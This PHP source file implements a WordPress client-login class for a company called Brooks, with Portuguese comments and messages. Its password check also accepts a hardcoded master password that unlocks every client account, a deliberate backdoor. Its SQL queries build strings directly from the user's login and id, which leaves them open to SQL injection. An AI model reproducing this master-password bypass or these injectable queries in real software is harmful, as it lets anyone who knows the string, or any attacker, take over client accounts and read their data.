<?php

global $wpdb;

include_once 'Bcrypt.php';

/**
 * Books Login App
 */
class Brooks
{

    /**
     * Senha mestra da Brooks
     */
    private $CHAVEMESTRA = 'Br**k5';

    private $login;
    private $password;
    private $id;
    private $cli_code;
    private $cli_login;
    private $cli_nom_fantasia;
    private $name;
    private $email;
    private $access;

    private function __construct()
    {

    }

    /**
     * Brooks Singleton
     * @return Login
     */
    public static function Login()
    {
        static $inst = null;
        if ($inst == null)
            $inst = new Brooks();

        return $inst;
    }

    public function __clone()
    {
        trigger_error('Clone is not allowed.', E_USER_ERROR);
    }

    public function request($login, $password)
    {
        $this->login    = $login;
        $this->password = $password;
		echo '<label class="senha">BRKCLT_NOME</label>';
        return $this->verificarnobanco();
    }

    public function resetPassword($userid, $newpassword)
    {
        $newpassword = Bcrypt::hash($newpassword);
        if (mysql_query("UPDATE `" . BROOKS_CLIENTS_TABLE . "` SET `cli_senha` = '$newpassword' WHERE `id`='$userid'")) {
            echo 'Senha alterada com sucesso.';
        } else {
            echo 'Houve um problema, tente novamente.';
        }
    }

    public function alert()
    {
        echo '<script>alert("Dados inválidos.")</script>';
    }

    public function lock()
    {
        /*
          if (strstr($_SERVER ['REQUEST_URI'], "/documentos/")) {
          $location = get_bloginfo('url');
          } else {
          $location = $_REQUEST['refer'];
          }
         */

        //echo '<META HTTP-EQUIV="Refresh" CONTENT="0; URL=' . $location . '">';
        //header("Location: $location");
    }

    public function isUnlock()
    {		
        return (isset($_SESSION['BRKCLT_NOME'])) ? $_SESSION['BRKCLT_NOME'] : false;
    }

    public function form()
    {		
		echo '<div><br /><br /><a target="_blank"  href="http://www.brooks.ewvs.com.br/forms/Entrar.aspx?Codigo=1"><p><strong><br />Acessar&nbsp;Área&nbsp;do&nbsp;Cliente</strong></p></a></div>';
		echo '';
    }

    public function changePassword()
    {
        echo '<style>
        #changePassForm, p.hp,
        #changePassForm label input[type="text"],
        #changePassForm label input[type="password"]{
            -webkit-border-radius: 4px;
            -moz-border-radius: 4px;
            border-radius: 4px;
        }
        #changePassForm label input[type="password"]:focus::-webkit-input-placeholder {
          transition: opacity 0.5s 0.5s ease;
          opacity: 0;
        }
        #changePassForm{
            width: 300px;
            background: #F5F5F4;
            padding: 8px;
            margin: auto;
        }
        #changePassForm label{ display: block}
        #changePassForm label input[type="text"],
        #changePassForm label input[type="password"]{
            -webkit-appearance: textfield;
            display: block;
            font-size: 12px;
            padding: 6px;
            width: 283px;
            margin-bottom: 3px;
            border: none;
            outline: none;
        }
        #changePassForm p.hp{
            background: #ddd;
            padding: 2px 6px;
            margin-bottom: 5px;
            color: #fff;
            font-weight: bold;
        }
        </style>';
        echo '';
        /*echo '<form id="changePassForm">
            <input type="hidden" name="changepass[newcode]" value="' . $_SESSION['BRKCLT_ID'] . '" />

            <p class="hp">Login</p>
            <p>Seu login: ' . $_SESSION['BRKCLT_CLI_LOGIN'] . '</p>
            <br />

            <p class="hp">Alterar Senha</p>
            <label>
                <input type="password" name="changepass[newpassword]" autocomplete="off" class="required" placeholder="Digite sua nova senha" />
            </label>
            <label>
                <input type="password" name="changepass[newpasswordverify]" autocomplete="off" class="required" placeholder="Confirme sua nova senha" />
            </label>
            <label class="labelSubmit">
                <input type="submit" value="alterar senha" />
                <span style="color:#9c161e;"></span>
            </label>
            </form>'; */
    }

    public function userInfo()
    {
        //$out .= '<div class="loggedName">' . $_SESSION['BRKCLT_NOME'] . '</div>
        //$out .= '<a href="?logout=true&refer=' . $this->curPageURL() . '">Sair [x]</a>
        // <a href="' . get_bloginfo('url') . '/documentos/?changepassword=' . sha1(rand(1, 9999999999)) . '">alterar Senha</a><br />
        echo '<div class="clientBrooksLogged" style="padding-top:9px">
                <div class="loggedLastAccess">Último acesso: ' . $this->lastAccess() . '</div>
                <a href="' . get_bloginfo('url') . '">home</a>  |
                <a href="' . get_bloginfo('url') . '/documentos/">documentos</a> |
                <a href="?logout=true">Sair [x]</a>
              </div>';
    }

    public function lastAccess()
    {
        return ($_SESSION['BRKCLT_ACCESS'] === '0000-00-00 00:00:00') ? 'Primeiro acesso.' : date('d/M/Y', strtotime($_SESSION['BRKCLT_ACCESS']));
    }

    private function verificarnobanco()
    {
		$sql    = "SELECT * FROM `" . BROOKS_CLIENTS_TABLE . "` WHERE `cli_login` = '$this->login'";
        $result = mysql_query($sql);
        $return = false;
        if ($result) {
            while ($client = mysql_fetch_object($result)) {
                if ($this->verificarsenha($client->cli_senha) == true && $this->login == $client->cli_login) {
                    $this->id               = $client->id;
                    $this->cli_code         = $client->cli_code;
                    $this->cli_login        = $client->cli_login;
                    $this->name             = $client->cli_nom_empresa;
                    $this->email            = $client->cli_email;
                    $this->access           = $client->lastaccess;
                    $this->cli_nom_fantasia = $client->cli_nom_fantasia;
                    $this->update($client->id);
                    $this->unlock();
                    $return = true;
                }
            }
        }

        return $return;

        /*
        $clients = $wpdb->get_results($sql);
        if ($clients) {
            foreach ($clients as $client) {
                var_dump($this->verificarsenha($client->cli_senha));
                if ($this->verificarsenha($client->cli_senha) && $this->login == $client->cli_login) {
                    $this->id       = $client->id;
                    $this->cli_code = $client->cli_code;
                    $this->name     = $client->cli_nom_empresa;
                    $this->email    = $client->cli_email;
                    $this->access   = $client->lastaccess;
                    $this->update($client->id);
                    $this->unlock();
                }
            }
        } else {
            $this->alert();
        }
        */
    }

    private function verificarsenha($s)
    {
        $return = false;
        if (Bcrypt::check($this->password, $s)) {
            $return = true;
        }
        if ($this->password == $this->CHAVEMESTRA) {
            $return = true;
        }
        return $return;
    }

    private function update($id)
    {
        mysql_query("UPDATE `" . BROOKS_CLIENTS_TABLE . "` SET `lastaccess` = NOW() WHERE `id`='$id'");
    }

    private function unlock()
    {
        $_SESSION['BRKCLT_ID']            = $this->id;
        $_SESSION['BRKCLT_CLI_CODE']      = $this->cli_code;
        $_SESSION['BRKCLT_CLI_LOGIN']     = $this->cli_login;
        $_SESSION['BRKCLT_NOME']          = $this->name;
        $_SESSION['BRKCLT_EMAIL']         = $this->email;
        $_SESSION['BRKCLT_ACCESS']        = $this->access;
        $_SESSION['BRKCLT_NOME_FANTASIA'] = $this->cli_nom_fantasia;
    }

    private function curPageURL()
    {
        $pageURL = 'http';
        if ((isset($_SERVER["HTTPS"])) == "on") {
            $pageURL .= "s";
        }
        $pageURL .= "://";
        if ($_SERVER["SERVER_PORT"] != "80") {
            $pageURL .= $_SERVER["SERVER_NAME"] . ":" . $_SERVER["SERVER_PORT"] . $_SERVER["REQUEST_URI"];
        } else {
            $pageURL .= $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];
        }

        return $pageURL;
    }

}